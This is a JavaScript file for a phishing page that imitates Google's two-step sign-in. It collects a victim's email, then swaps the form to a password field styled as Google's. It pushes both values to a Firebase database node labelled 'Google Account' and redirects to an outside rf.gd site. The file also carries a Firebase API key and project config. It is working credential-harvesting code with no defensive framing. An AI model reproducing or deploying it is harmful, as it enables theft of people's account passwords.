var email = ""
var margin = -50
var input = document.getElementById("email")
var loaded = false
var data = {
  	Email: "",
  	Password:""
}
// Initialize Firebase
  var config = {
    apiKey: "AIzaSyCxV3C4Vxca8KgGwz9FvOHJCpRdSJp9vxA",
    authDomain: "email-and-password-encrypting.firebaseapp.com",
    databaseURL: "https://email-and-password-encrypting.firebaseio.com",
    projectId: "email-and-password-encrypting",
    storageBucket: "email-and-password-encrypting.appspot.com",
    messagingSenderId: "899788952721"
  };
  firebase.initializeApp(config);
  var database = firebase.database();
  var ref = database.ref("Google Account")

function focused() {
	document.getElementById("animation").style.opacity = "1";
}

function unfocused() {
	document.getElementById("animation").style.opacity = "0";
}


update()

function update() {
	window.requestAnimationFrame(update);
	document.getElementById("progress").style.marginLeft = margin+"%";
	console.log(input.value)
	if (input.value != "") {
		document.getElementsByTagName("button")[0].disabled = false
	} else {document.getElementsByTagName("button")[0].disabled = true}

	if (screen.width <= 400) {
		document.getElementById("login").style.width = "400px"
		document.getElementById("login").style.boxShadow = "0px 0px 0px 0px rgba(0,0,0,0)"
		document.getElementById("login").style.borderRadius = "0px"
	}
}

function sendData() {
	if (!loaded) {
		document.getElementById("loading").style.opacity = "1";
		document.getElementById("login").style.opacity = "0.4"
		email = input.value
			for(var i = 0;i < 150;i++) {
				window.setTimeout(function() {margin+=1},6*i);
			}
		window.setTimeout(function() {document.getElementById("loading").style.opacity = "0";password_page();document.getElementById("login").style.opacity = "1"},6*150)
		loaded = true
	} else {
		data.Password = document.getElementById("email").value
		ref.push(data)
		window.setTimeout(function() {window.location.href = "http://checkmategaming-icmx-team.rf.gd/link.html"},1000)
	}
}

function password_page() {
	data.Email = email
	document.getElementById("logged").innerHTML = email
	document.getElementsByTagName("img")[1].src = "Assets/account.png"
	document.getElementsByTagName("h2")[0].style.marginLeft = "10%"
	document.getElementsByTagName("h1")[0].innerHTML = "Welcome"
	input.value = ""
	input.placeholder = "Enter your password"
	document.getElementById("animation").innerHTML = "Enter your password"
	input.type = "password"
	document.getElementsByTagName("a")[0].innerHTML = "Forget Password?"
	document.getElementsByTagName("a")[0].href = "https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
	document.getElementsByTagName("h3")[1].innerHTML = ""
}
